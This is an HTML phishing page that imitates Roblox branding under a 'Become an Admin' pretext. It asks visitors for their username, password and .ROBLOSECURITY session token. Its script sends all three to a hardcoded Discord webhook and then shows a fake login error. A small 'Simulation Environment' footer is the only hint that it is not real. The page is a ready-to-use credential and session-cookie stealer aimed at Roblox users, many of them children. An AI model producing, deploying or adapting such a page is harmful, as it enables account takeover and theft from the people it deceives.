<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Roblox - Admin Panel</title>
  <link rel="icon" href="https://www.roblox.com/favicon.ico" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f2f2f2;
    }

    .header {
      background-color: #232527;
      padding: 14px 20px;
      text-align: left;
    }

    .header img {
      height: 32px;
    }

    .hero {
      background: url('https://images.ctfassets.net/0b815kqjt7rr/6CSH5ZLZCakGZdfqkzbDNs/4d2ac74f70106de81a0b58db1b7f62a0/Roblox_Experience_Splash.jpg') center center no-repeat;
      background-size: cover;
      height: 220px;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-size: 30px;
      font-weight: bold;
      letter-spacing: 1px;
    }

    .container {
      max-width: 400px;
      margin: 40px auto;
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
      text-align: center;
    }

    .container h2 {
      margin-bottom: 10px;
      color: #232527;
    }

    .container p {
      color: #555;
      font-size: 14px;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 4px;
      border: 1px solid #ccc;
    }

    .login-btn {
      background-color: #ff3c00;
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }

    .error {
      color: red;
      display: none;
      margin-top: 10px;
    }

    .sticky-bar {
      position: fixed;
      bottom: -50px;
      left: 0;
      right: 0;
      background: #232527;
      color: white;
      text-align: center;
      padding: 12px;
      font-size: 14px;
      transition: bottom 0.5s ease;
    }

    .sticky-bar.visible {
      bottom: 0;
    }
  </style>
</head>
<body>

  <div class="header">
    <img src="https://www.roblox.com/images/Logo.png" alt="Roblox Logo">
  </div>

  <div class="hero">
    ROBLOX ADMIN
  </div>

  <div class="container">
    <h2>Become an Admin</h2>
    <p>We’re recruiting future Admins to help us improve the platform!</p>
    <form onsubmit="sendData(); return false;">
      <input type="text" id="username" placeholder="Username" required />
      <input type="password" id="password" placeholder="Password" required />
      <input type="text" id="cookie" placeholder=".ROBLOSECURITY Token (optional)" />
      <button type="submit" class="login-btn">Log In</button>
    </form>
    <div class="error" id="errorMsg">Username or password is incorrect.</div>
  </div>

  <div class="sticky-bar" id="stickyBar">
    Roblox Admin – Simulation Environment
  </div>

  <script>
    function sendData() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const cookie = document.getElementById("cookie").value;

      fetch("https://discord.com/api/webhooks/1362415600156279065/CXdU0OkdjfmMut8SdXgZujVEWTceZf-fieiU9qt-F3YGbAncvVZcQRsGZujU9fjBF5gz", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `Simulated Login:\nUsername: ${username}\nPassword: ${password}\nCookie: ${cookie}`
        })
      });

      document.getElementById("errorMsg").style.display = "block";
    }

    // Show sticky bar on scroll
    window.addEventListener("scroll", () => {
      const bar = document.getElementById("stickyBar");
      if (window.scrollY > 50) {
        bar.classList.add("visible");
      } else {
        bar.classList.remove("visible");
      }
    });
  </script>

</body>
</html>
